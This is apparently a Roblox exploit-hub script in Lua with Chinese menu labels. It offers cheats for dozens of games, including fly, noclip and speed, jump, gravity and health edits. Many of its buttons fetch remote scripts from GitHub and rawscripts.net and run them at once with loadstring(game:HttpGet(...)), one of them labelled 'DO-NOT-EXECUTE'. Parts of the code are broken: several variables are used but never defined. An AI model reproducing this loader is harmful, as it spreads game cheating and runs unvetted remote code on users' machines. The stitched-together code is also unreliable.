local Tab16 = Tab("勘探中")
local Tab17 = Tab("法宝模拟器")
local Tab18 = Tab("在披萨店工作")
local Tab19 = Tab("战斗勇士")
local Tab20 = Tab("一次尘土的旅行")
local Tab21 = Tab("破坏者谜团2")
local Tab22 = Tab("模仿者")
local Tab23 = Tab("火箭发射模拟器")
local Tab24 = Tab("只因剑")
local Tab25 = Tab("森林里的99夜")
local Tab26 = Tab("旗帜战争")
local Tab27 = Tab("逃出建筑")
local Tab28 = Tab("打墙模拟器")
local Tab29 = Tab("生存巨人")
local Tab30 = Tab("健身房之星模拟器")
local Tab31 = Tab("死铁轨")
local Tab32 = Tab("墨水游戏")
local Tab33 = Tab("自然灾害模拟器")
local Tab34 = Tab("穷小子打工记")
local Tab35 = Tab("最后的黎明")
local Tab36 = Tab("索纳里亚世界")
local Tab37 = Tab("河北唐县")
local Tab38 = Tab("被遗弃")
local Tab39 = Tab("骨折模拟器")
local Tab40 = Tab("地下城任务")
local Tab41 = Tab("极速传奇")
local Tab42 = Tab("一路向西")
local Tab43 = Tab("汽车经销商大亨")
local Tab44 = Tab("兵工厂")
local Tab45 = Tab("by手腕")
local Tab46 = Tab("超级足球联赛")
local Tab47 = Tab("战争大亨")
local Tab48 = Tab("吃掉世界")
local Tab49 = Tab("隐藏尸体")
local Tab50 = Tab("猎杀僵尸")
local Tab51 = Tab("建造汽车")
local Tab52 = Tab("原始追求/原始追击")
local Tab53 = Tab("攀爬与滑行")
local Tab54 = Tab("拔出一把剑")
local Tab55 = Tab("暴力区")
local Tab56 = Tab("邪恶的事情会发生什么")
local Tab57 = Tab("住宅大屠杀")
local Tab58 = Tab("犯罪")
local Tab59 = Tab("封锁战线")
local Tab60 = Tab("终极战场")
local Tab61 = Tab("最强的拳击模拟器")
local Tab62 = Tab("排球传奇")
local Tab63 = Tab("竞争对手")
local Tab64 = Tab("柔术无限")
local Tab65 = Tab("超速射击")
local Tab66 = Tab("英雄战场")
local Tab67 = Tab("蓝色锁")
local Tab68 = Tab("无标题的拳击")
local Tab69 = Tab("越狱")
local Tab70 = Tab("生存战争")
local Tab71 = Tab("停电")
local Tab72 = Tab("战争机器")
local Tab73 = Tab("别碰按钮")
local Tab74 = Tab("在超级商店过夜生存")
local Tab75 = Tab("失落的前线")
local Tab76 = Tab("建造一个奥比")
local Tab77 = Tab("聊天室💬 [阿拉伯语]")
local Tab78 = Tab("[✨2倍经验✨]植物进化")
local Tab79 = Tab("🦘跳跃去见辫inrots！")
local Tab80 = Tab("钓鱼！ 🐟")
local Tab81 = Tab("[史莱姆]键盘ASMR塔")
local Tab82 = Tab("[🎣鱼+🐶宠物]安吉尔山🥴")
local Tab83 = Tab("🍰 烘焙或死亡 💀")
local Tab84 = Tab("打破朋友 🦴")
local Tab85 = Tab("【⚔️公会战争】[第38卷]修炼：凡人至仙人")
local Tab86 = Tab("杀人犯对警长决斗")
local Tab87 = Tab("🥊拳击怪兽！ 🥊")
local Tab88 = Tab("隐形藏匿")
local Tab89 = Tab("[第一人称射击]电影上传者")
local Tab90 = Tab("成为杀手级重码")
local Tab91 = Tab("[✨] NPC或者死！ 💢")
local Tab92 = Tab("免费UGC✨奥比")
local Tab93 = Tab(" [1.0] 基础论文教育 RP")
local Tab94 = Tab("[🎅🏻]在筏子上生存")
local Tab95 = Tab("挂杆塔")
local Tab96 = Tab("终极采矿大亨")
Window:Divider()
local Tab97 = Tab("更多服务器")

local Paragraph = Tab0:Paragraph({
    Title = "黑白脚本DC群",
    Desc = "点击复制按钮获取Discord邀请链接",
    
    -- 视觉设置
    Image = "rbxassetid://7040347038", -- 背景图片
    ImageSize = 30, -- 图片显示尺寸
    Thumbnail = "", -- 缩略图（留空）
    ThumbnailSize = 80, -- 缩略图尺寸
    
    Locked = false, -- 是否锁定
    
    -- 按钮配置
    Buttons = {
        {
            Icon = "crown", -- 按钮图标
            Title = "复制链接", -- 按钮文本
            Callback = function()
                local cardKey = "https://discord.gg/MsdBcJBS"
                
                -- 安全执行复制操作
                local success, errorMsg = pcall(function()
                    -- 检查剪贴板功能是否可用
                    if not setclipboard then
                        error("剪贴板功能不可用")
                    end
                    
                    -- 复制到剪贴板
                    setclipboard(cardKey)
                    
                    -- 显示成功通知
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = "✅ 复制成功",
                        Text = "Discord邀请链接已复制到剪贴板",
                        Icon = "rbxassetid://7040347038",
                        Duration = 5,
                        Button1 = "确定",
                        Callback = function()
                            print("用户确认了通知")
                        end
                    })
                    
                    -- 控制台输出（便于调试）
                    print("[系统] 已复制Discord链接: " .. cardKey)
                end)
                
                -- 错误处理
                if not success then
                    -- 显示错误通知
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = "❌ 复制失败",
                        Text = "请手动复制链接: " .. cardKey,
                        Icon = "rbxassetid://7040347038",
                        Duration = 8, -- 延长显示时间让用户能手动复制
                        Button1 = "我知道了"
                    })
                    
                    -- 错误日志
                    warn("复制失败:", errorMsg)
                    print("请手动复制链接: " .. cardKey)
                end
            end,
        }
    }
})

-- 可选：添加段落状态跟踪
if Paragraph then
    print("DC群邀请段落已加载")
    
    -- 可选：添加一些额外功能
    -- 例如：添加鼠标悬停提示
    task.spawn(function()
        -- 这里可以添加额外的交互逻辑
    end)
end

-- 简介 (Tab0)
Button(Tab0, "最没母的群570910164千万别进否则会浮木会死掉", function()
    pcall(function()
    end)
end)

Button(Tab0, "禁止倒卖", function()
    pcall(function()
    end)
end)

Button(Tab0, "祝你游戏愉快", function()
    pcall(function()
    end)
end)

Button(Tab0, "免费半缝合脚本", function()
    pcall(function()
    end)
end)

Button(Tab0, "祝你一路顺风", function()
    pcall(function()
    end)
end)

Button(Tab0, "大部分会在周六周日更新", function()
    pcall(function()
    end)
end)

Tab0:Divider() -- 插入分割线

Button(Tab0, "小游戏", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/tfcygvunbind/Apple/7de4d4365f369205dffe10c090e0d042d663a628/%E5%B0%8F%E6%B8%B8%E6%88%8F'))()

    end)
end)

Button(Tab0, "自动汉化", function()
    pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/tfcygvunbind/557/main/自动'))()

    end)
end)

-- 通用 (Tab1)
Button(Tab1, "以后会出现美女😋\n\n我骗你，你就是人。", function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-DO-NOT-EXECUTE-61096"))()
    
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        -- 执行脚本时单独捕获错误，避免整体崩溃
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "怪物😱",
            Content = execSuccess and "已成功开启" or "脚本执行失败（语法/兼容问题）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    end
end)

Button(Tab1, "飞行\n\n飞行👍", function() 
    local main = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local up = Instance.new("TextButton")
local down = Instance.new("TextButton")
local onof = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local plus = Instance.new("TextButton")
local speed = Instance.new("TextLabel")
local mine = Instance.new("TextButton")
local closebutton = Instance.new("TextButton")
local mini = Instance.new("TextButton")
local mini2 = Instance.new("TextButton")

main.Name = "main"
main.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
main.ResetOnSpawn = false

Frame.Parent = main
Frame.BackgroundColor3 = Color3.fromRGB(163, 255, 137)
Frame.BorderColor3 = Color3.fromRGB(103, 221, 213)
Frame.Position = UDim2.new(0.100320168, 0, 0.379746825, 0)
Frame.Size = UDim2.new(0, 190, 0, 57)

up.Name = "up"
up.Parent = Frame
up.BackgroundColor3 = Color3.fromRGB(79, 255, 152)
up.Size = UDim2.new(0, 44, 0, 28)
up.Font = Enum.Font.SourceSans
up.Text = "up"
up.TextColor3 = Color3.fromRGB(0, 0, 0)
up.TextSize = 14.000

down.Name = "down"
down.Parent = Frame
down.BackgroundColor3 = Color3.fromRGB(215, 255, 121)
down.Position = UDim2.new(0, 0, 0.491228074, 0)
down.Size = UDim2.new(0, 44, 0, 28)
down.Font = Enum.Font.SourceSans
down.Text = "down"
down.TextColor3 = Color3.fromRGB(0, 0, 0)
down.TextSize = 14.000

onof.Name = "onof"
onof.Parent = Frame
onof.BackgroundColor3 = Color3.fromRGB(255, 249, 74)
onof.Position = UDim2.new(0.702823281, 0, 0.491228074, 0)
onof.Size = UDim2.new(0, 56, 0, 28)
onof.Font = Enum.Font.SourceSans
onof.Text = "fly"
onof.TextColor3 = Color3.fromRGB(0, 0, 0)
onof.TextSize = 14.000

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(242, 60, 255)
TextLabel.Position = UDim2.new(0.469327301, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 100, 0, 28)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Fly GUI V3"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

plus.Name = "plus"
plus.Parent = Frame
plus.BackgroundColor3 = Color3.fromRGB(133, 145, 255)
plus.Position = UDim2.new(0.231578946, 0, 0, 0)
plus.Size = UDim2.new(0, 45, 0, 28)
plus.Font = Enum.Font.SourceSans
plus.Text = "+"
plus.TextColor3 = Color3.fromRGB(0, 0, 0)
plus.TextScaled = true
plus.TextSize = 14.000
plus.TextWrapped = true

speed.Name = "speed"
speed.Parent = Frame
speed.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
speed.Position = UDim2.new(0.468421042, 0, 0.491228074, 0)
speed.Size = UDim2.new(0, 44, 0, 28)
speed.Font = Enum.Font.SourceSans
speed.Text = "1"
speed.TextColor3 = Color3.fromRGB(0, 0, 0)
speed.TextScaled = true
speed.TextSize = 14.000
speed.TextWrapped = true

mine.Name = "mine"
mine.Parent = Frame
mine.BackgroundColor3 = Color3.fromRGB(123, 255, 247)
mine.Position = UDim2.new(0.231578946, 0, 0.491228074, 0)
mine.Size = UDim2.new(0, 45, 0, 29)
mine.Font = Enum.Font.SourceSans
mine.Text = "-"
mine.TextColor3 = Color3.fromRGB(0, 0, 0)
mine.TextScaled = true
mine.TextSize = 14.000
mine.TextWrapped = true

closebutton.Name = "Close"
closebutton.Parent = main.Frame
closebutton.BackgroundColor3 = Color3.fromRGB(225, 25, 0)
closebutton.Font = "SourceSans"
closebutton.Size = UDim2.new(0, 45, 0, 28)
closebutton.Text = "X"
closebutton.TextSize = 30
closebutton.Position =  UDim2.new(0, 0, -1, 27)

mini.Name = "minimize"
mini.Parent = main.Frame
mini.BackgroundColor3 = Color3.fromRGB(192, 150, 230)
mini.Font = "SourceSans"
mini.Size = UDim2.new(0, 45, 0, 28)
mini.Text = "T"
mini.TextSize = 30
mini.Position = UDim2.new(0, 44, -1, 27)

mini2.Name = "minimize2"
mini2.Parent = main.Frame
mini2.BackgroundColor3 = Color3.fromRGB(192, 150, 230)
mini2.Font = "SourceSans"
mini2.Size = UDim2.new(0, 45, 0, 28)
mini2.Text = "T"
mini2.TextSize = 30
mini2.Position = UDim2.new(0, 44, -1, 57)
mini2.Visible = false

speeds = 1

local speaker = game:GetService("Players").LocalPlayer

local chr = game.Players.LocalPlayer.Character
local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")

nowe = false

game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = "Fly GUI V3";
	Text = "lnjection succeeded";
	Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
Duration = 5;

Frame.Active = true -- main = gui
Frame.Draggable = true

onof.MouseButton1Down:connect(function()

	if nowe == true then
		nowe = false

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
	else 
		nowe = true



		for i = 1, speeds do
			spawn(function()

				local hb = game:GetService("RunService").Heartbeat	


				tpwalking = true
				local chr = game.Players.LocalPlayer.Character
				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
					if hum.MoveDirection.Magnitude > 0 then
						chr:TranslateBy(hum.MoveDirection)
					end
				end

			end)
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		local Char = game.Players.LocalPlayer.Character
		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

		for i,v in next, Hum:GetPlayingAnimationTracks() do
			v:AdjustSpeed(0)
		end
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
	end




	if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then



		local plr = game.Players.LocalPlayer
		local torso = plr.Character.Torso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 50
		local speed = 0


		local bg = Instance.new("BodyGyro", torso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = torso.CFrame
		local bv = Instance.new("BodyVelocity", torso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		if nowe == true then
			plr.Character.Humanoid.PlatformStand = true
		end
		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
			game:GetService("RunService").RenderStepped:Wait()

			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+.5+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-1
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0,0)
			end
			--	game.Players.LocalPlayer.Character.Animate.Disabled = true
			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		end
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		tpwalking = false




	else
		local plr = game.Players.LocalPlayer
		local UpperTorso = plr.Character.UpperTorso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 50
		local speed = 0


		local bg = Instance.new("BodyGyro", UpperTorso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = UpperTorso.CFrame
		local bv = Instance.new("BodyVelocity", UpperTorso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		if nowe == true then
			plr.Character.Humanoid.PlatformStand = true
		end
		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
			wait()

			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+.5+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-1
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0,0)
			end

			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		end
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		tpwalking = false



	end





end)

local tis

up.MouseButton1Down:connect(function()
	tis = up.MouseEnter:connect(function()
		while tis do
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,1,0)
		end
	end)
end)

up.MouseLeave:connect(function()
	if tis then
		tis:Disconnect()
		tis = nil
	end
end)

local dis

down.MouseButton1Down:connect(function()
	dis = down.MouseEnter:connect(function()
		while dis do
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-1,0)
		end
	end)
end)

down.MouseLeave:connect(function()
	if dis then
		dis:Disconnect()
		dis = nil
	end
end)


game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(char)
	wait(0.7)
	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
	game.Players.LocalPlayer.Character.Animate.Disabled = false

end)


plus.MouseButton1Down:connect(function()
	speeds = speeds + 1
	speed.Text = speeds
	if nowe == true then


		tpwalking = false
		for i = 1, speeds do
			spawn(function()

				local hb = game:GetService("RunService").Heartbeat	


				tpwalking = true
				local chr = game.Players.LocalPlayer.Character
				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
					if hum.MoveDirection.Magnitude > 0 then
						chr:TranslateBy(hum.MoveDirection)
					end
				end

			end)
		end
	end
end)
mine.MouseButton1Down:connect(function()
	if speeds == 1 then
		speed.Text = 'flyno1'
		wait(1)
		speed.Text = speeds
	else
		speeds = speeds - 1
		speed.Text = speeds
		if nowe == true then
			tpwalking = false
			for i = 1, speeds do
				spawn(function()

					local hb = game:GetService("RunService").Heartbeat	


					tpwalking = true
					local chr = game.Players.LocalPlayer.Character
					local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
					while tpwalking and hb:Wait() and chr and hum and hum.Parent do
						if hum.MoveDirection.Magnitude > 0 then
							chr:TranslateBy(hum.MoveDirection)
						end
					end

				end)
			end
		end
	end
end)

closebutton.MouseButton1Click:Connect(function()
	main:Destroy()
end)

mini.MouseButton1Click:Connect(function()
	up.Visible = false
	down.Visible = false
	onof.Visible = false
	plus.Visible = false
	speed.Visible = false
	mine.Visible = false
	mini.Visible = false
	mini2.Visible = true
	main.Frame.BackgroundTransparency = 1
	closebutton.Position =  UDim2.new(0, 0, -1, 57)
end)

mini2.MouseButton1Click:Connect(function()
	up.Visible = true
	down.Visible = true
	onof.Visible = true
	plus.Visible = true
	speed.Visible = true
	mine.Visible = true
	mini.Visible = true
	mini2.Visible = false
	main.Frame.BackgroundTransparency = 0 
	closebutton.Position =  UDim2.new(0, 0, -1, 27)
end)
    
    -- 校验角色核心组件，避免空值错误
    local LocalPlayer = game.Players.LocalPlayer
    if not LocalPlayer or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        WindUI:Notify({
            Title = "飞行",
            Content = "加载失败：角色未加载完成",
            Icon = "error",
            Duration = 3
        })
        return
    end

    -- 分步捕获错误，精准反馈
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "飞行",
            Content = execSuccess and "已开启（自由飞行模式👍）" or "执行失败（语法/兼容/重力冲突）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        local errMsg = getSuccess and "脚本内容为空" or "链接失效/网络错误"
        WindUI:Notify({
            Title = "飞行",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab1, "无敌少侠R15（飞行）\n\n太帅了", function()
    local scriptUrl = "https://rawscripts.net/raw/Universal-Script-Invinicible-Flight-R15-45414"
    
    -- 校验R15角色适配性
    local LocalPlayer = game.Players.LocalPlayer
    if not LocalPlayer or not LocalPlayer.Character then
        WindUI:Notify({
            Title = "无敌少侠R15",
            Content = "加载失败：角色未加载完成",
            Icon = "error",
            Duration = 3
        })
        return
    end

    -- 分步捕获错误，适配R15特性
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "无敌少侠R15",
            Content = execSuccess and "已开启（R15飞行+无敌太帅了✨）" or "执行失败（非R15模型/语法兼容问题）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        local errMsg = getSuccess and "脚本内容为空" or "链接失效/网络错误"
        WindUI:Notify({
            Title = "无敌少侠R15",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)
Button(Tab1, "无敌少侠r6（飞行）\n\n太帅了", function()
    local scriptUrl = "https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/%E6%97%A0%E6%95%8C%E5%B0%91%E4%BE%A0%E9%A3%9E%E8%A1%8Cr6.txt"
    
    -- 校验R6角色适配性
    local LocalPlayer = game.Players.LocalPlayer
    if not LocalPlayer or not LocalPlayer.Character then
        WindUI:Notify({
            Title = "无敌少侠R6",
            Content = "加载失败：角色未加载完成",
            Icon = "error",
            Duration = 3
        })
        return
    end

    -- 分步捕获错误，适配R6特性
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "无敌少侠R6",
            Content = execSuccess and "已开启（R6飞行+无敌太帅了✨）" or "执行失败（非R6模型/语法兼容问题）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        local errMsg = getSuccess and "脚本内容为空" or "链接失效/网络错误"
        WindUI:Notify({
            Title = "无敌少侠R6",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Slider(Tab1, "移动速度", 1, 999, game.Players.LocalPlayer.Character.Humanoid.WalkSpeed, function(a) 
    pcall(function()
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = a
    end)
end)

Slider(Tab1, "跳跃高度", 1, 999, game.Players.LocalPlayer.Character.Humanoid.JumpPower, function(a) 
    pcall(function()
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = a
    end)
end)

Slider(Tab1, "重力设置", -50, 400, workspace.Gravity, function(a) 
    pcall(function()
        workspace.Gravity = a
    end)
end)

Slider(Tab1, "修改生命值", 1, 999, game.Players.LocalPlayer.Character.Humanoid.Health, function(a) 
    pcall(function()
        game.Players.LocalPlayer.Character.Humanoid.Health = a
    end)
end)


Toggle(Tab1, "穿墙", false, function(a)
    pcall(function()
        for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("BasePart") then
                v.CanCollide = not a
            end
        end
    end)
end)

Toggle(Tab1, "夜视", false, function(a)
    pcall(function()
        if a then
            game.Lighting.Ambient = Color3.new(1, 1, 1)
        else
            game.Lighting.Ambient = Color3.new(0, 0, 0)
        end
    end)
end)

Button(Tab1, "光影V4\n\n真美丽", function()
    local scriptUrl = "https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"
    
    -- 校验光照服务可用性，提前规避基础错误
    local Lighting = game:GetService("Lighting")
    if not Lighting then
        WindUI:Notify({
            Title = "光影V4",
            Content = "加载失败：光照服务未找到",
            Icon = "error",
            Duration = 3
        })
        return
    end

    -- 分步捕获请求与执行错误，精准定位问题
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        -- 清理旧光影特效（覆盖全类型），避免叠加冲突/卡顿
        for _, effect in ipairs(Lighting:GetChildren()) do
            if effect:IsA("ColorCorrectionEffect") or effect:IsA("BloomEffect") 
               or effect:IsA("BlurEffect") or effect:IsA("SunRaysEffect") 
               or effect:IsA("DepthOfFieldEffect") then
                effect:Destroy()
            end
        end
        
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "光影V4",
            Content = execSuccess 
                and "已开启（V4高清光影生效✨）" 
                or "执行失败（语法/特效不兼容/版本适配问题）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        -- 细化失败原因，便于排查
        local errMsg = getSuccess 
            and "脚本内容为空（链接无效）" 
            or "链接失效/网络错误/访问被拒"
        WindUI:Notify({
            Title = "光影V4",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab1, "踏空行走\n\n踏空", function()
    local scriptUrl = "https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float"
    
    -- 校验核心条件：玩家+角色+人形组件，避免空值错误
    local LocalPlayer = game.Players.LocalPlayer
    if not LocalPlayer or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Humanoid") then
        WindUI:Notify({
            Title = "踏空行走",
            Content = "加载失败：角色未加载完成",
            Icon = "error",
            Duration = 3
        })
        return
    end

    -- 分步捕获请求与执行错误，精准定位问题
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    
